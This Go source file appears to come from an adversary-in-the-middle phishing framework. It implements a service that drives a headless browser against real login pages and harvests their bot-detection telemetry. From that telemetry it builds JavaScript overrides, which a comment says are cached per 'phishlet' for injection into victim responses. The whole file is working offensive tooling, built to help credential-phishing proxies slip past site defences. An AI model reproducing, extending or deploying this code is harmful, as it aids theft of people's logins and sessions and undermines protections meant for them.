package aitm

import (
	"context"
	"fmt"
	"log/slog"
	"sync"
	"time"

	"github.com/travisbale/mirage/sdk"
)

// puppet is the interface that headless browser implementations satisfy.
type puppet interface {
	CollectTelemetry(ctx context.Context, targetURL string) (map[string]any, error)
	Shutdown(ctx context.Context) error
}

// overrideBuilder converts raw telemetry into a JS override snippet.
type overrideBuilder interface {
	BuildOverride(telemetry map[string]any) string
}

type cacheEntry struct {
	override  string
	expiresAt time.Time
}

// PuppetServiceConfig holds the parameters for constructing a PuppetService.
type PuppetServiceConfig struct {
	CacheTTL      time.Duration
	NavTimeout    time.Duration
	MaxConcurrent int
}

// PuppetService manages headless browser interactions for bot telemetry collection.
// It collects telemetry from target sites and caches JS override strings keyed
// by phishlet name for injection into victim responses.
type PuppetService struct {
	puppet  puppet
	builder overrideBuilder
	bus     eventBus
	logger  *slog.Logger
	cfg     PuppetServiceConfig

	cache       sync.Map // phishlet name → cacheEntry
	unsubscribe func()
	collectC    chan struct{} // semaphore bounding concurrent collections
	ctx         context.Context
	cancel      context.CancelFunc
}

func NewPuppetService(puppet puppet, builder overrideBuilder, bus eventBus, cfg PuppetServiceConfig, logger *slog.Logger) *PuppetService {
	if cfg.MaxConcurrent <= 0 {
		cfg.MaxConcurrent = 3
	}
	return &PuppetService{
		puppet:   puppet,
		builder:  builder,
		bus:      bus,
		logger:   logger,
		cfg:      cfg,
		collectC: make(chan struct{}, cfg.MaxConcurrent),
	}
}

// Start subscribes to phishlet-enabled events and triggers async collection.
// The provided context is used as the parent for all puppet collection goroutines;
// cancelling it (e.g. on daemon shutdown) cancels any in-flight collections.
func (s *PuppetService) Start(ctx context.Context) {
	s.ctx, s.cancel = context.WithCancel(ctx)
	s.unsubscribe = SubscribeFunc(s.bus, sdk.EventPhishletEnabled, s.handlePhishletEnabled)
}

// Shutdown cancels in-flight collections, unsubscribes from events, and shuts
// down the puppet backend.
func (s *PuppetService) Shutdown(ctx context.Context) error {
	if s.cancel != nil {
		s.cancel()
	}
	if s.unsubscribe != nil {
		s.unsubscribe()
	}
	return s.puppet.Shutdown(ctx)
}

// GetOverride returns the cached JS override for a phishlet, or "" if none.
func (s *PuppetService) GetOverride(phishletName string) string {
	val, ok := s.cache.Load(phishletName)
	if !ok {
		return ""
	}
	entry, ok := val.(cacheEntry)
	if !ok {
		return ""
	}
	if time.Now().After(entry.expiresAt) {
		s.cache.Delete(phishletName)
		return ""
	}
	return entry.override
}

// CollectAndCache runs the puppet browser against targetURL, builds the JS
// override, and caches it under phishletName.
func (s *PuppetService) CollectAndCache(ctx context.Context, phishletName, targetURL string) error {
	telemetry, err := s.puppet.CollectTelemetry(ctx, targetURL)
	if err != nil {
		return fmt.Errorf("puppet collect %s: %w", phishletName, err)
	}
	override := s.builder.BuildOverride(telemetry)
	s.cache.Store(phishletName, cacheEntry{
		override:  override,
		expiresAt: time.Now().Add(s.cfg.CacheTTL),
	})
	s.logger.Info("puppet telemetry cached", "phishlet", phishletName, "url", targetURL)
	return nil
}

func (s *PuppetService) handlePhishletEnabled(event Event) {
	cp, ok := event.Payload.(*ConfiguredPhishlet)
	if !ok {
		return
	}
	targetURL := deriveTargetURL(cp.Definition)
	if targetURL == "" {
		s.logger.Warn("puppet: cannot derive target URL", "phishlet", cp.Definition.Name)
		return
	}

	go func(name, url string) {
		// Acquire semaphore slot; drop if at capacity or shutting down.
		select {
		case s.collectC <- struct{}{}:
		case <-s.ctx.Done():
			return
		default:
			s.logger.Warn("puppet: collection slots full, skipping", "phishlet", name)
			return
		}
		defer func() { <-s.collectC }()
		ctx, cancel := context.WithTimeout(s.ctx, s.cfg.NavTimeout)
		defer cancel()
		if err := s.CollectAndCache(ctx, name, url); err != nil {
			s.logger.Error("puppet collection failed", "phishlet", name, "error", err)
		}
	}(cp.Definition.Name, targetURL)
}

// deriveTargetURL builds the real login URL from the phishlet's landing proxy host.
func deriveTargetURL(p *Phishlet) string {
	landing := p.FindLanding()
	if landing == nil {
		return ""
	}
	host := landing.OriginHost()
	path := p.Login.Path
	if path == "" {
		path = "/"
	}
	return "https://" + host + path
}
